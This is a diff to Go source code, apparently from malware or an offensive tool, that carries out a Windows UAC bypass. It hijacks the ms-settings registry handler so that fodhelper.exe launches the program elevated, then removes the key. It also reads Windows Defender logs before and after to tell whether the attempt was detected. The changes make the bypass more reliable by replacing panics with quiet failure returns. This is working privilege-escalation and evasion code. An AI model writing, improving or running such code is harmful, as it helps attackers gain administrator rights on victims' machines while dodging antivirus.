@@ -29,26 +29,33 @@ func bypassUAC() {
 func uacMsSettings() bool {
 	k, _, err := registry.CreateKey(registry.CURRENT_USER, MsSettingsKey+`\shell\open\command`, registry.SET_VALUE)
 	if err != nil {
-		panic(err)
+		return false
 	}
 	defer k.Close()
 
 	exePath, err := os.Executable()
 	if err != nil {
-		panic(err)
+		return false
 	}
 	if err := k.SetStringValue("", exePath); err != nil {
-		panic(err)
+		return false
 	}
-	_ = k.SetStringValue("DelegateExecute", "")
-	_ = k.Close()
+	if err := k.SetStringValue("DelegateExecute", ""); err != nil {
+		return false
+	}
 
 	start, err := executeCommand(system32+"\\wevtutil.exe", "qe", "Microsoft-Windows-Windows Defender/Operational", "/f:text").Output()
+	if err != nil {
+		return false
+	}
 
 	// Execute fodhelper.exe to trigger the UAC bypass
 	_ = executeCommand(system32+"\\fodhelper.exe", "uacbypass").Run()
 
 	end, err := executeCommand(system32+"\\wevtutil.exe", "qe", "Microsoft-Windows-Windows Defender/Operational", "/f:text").Output()
+	if err != nil {
+		return false
+	}
 
 	// Clean up the registry key after execution
 	_ = registry.DeleteKey(registry.CURRENT_USER, MsSettingsKey+`\shell\open\command`)
@@ -57,7 +64,7 @@ func uacMsSettings() bool {
 
 	// If the length of the end output is greater than the start output, it indicates that Windows Defender was triggered.
 	// In this case, it didn't work.
-	if err != nil || len(end) > len(start) {
+	if len(end) > len(start) {
 		return false
 	}
 
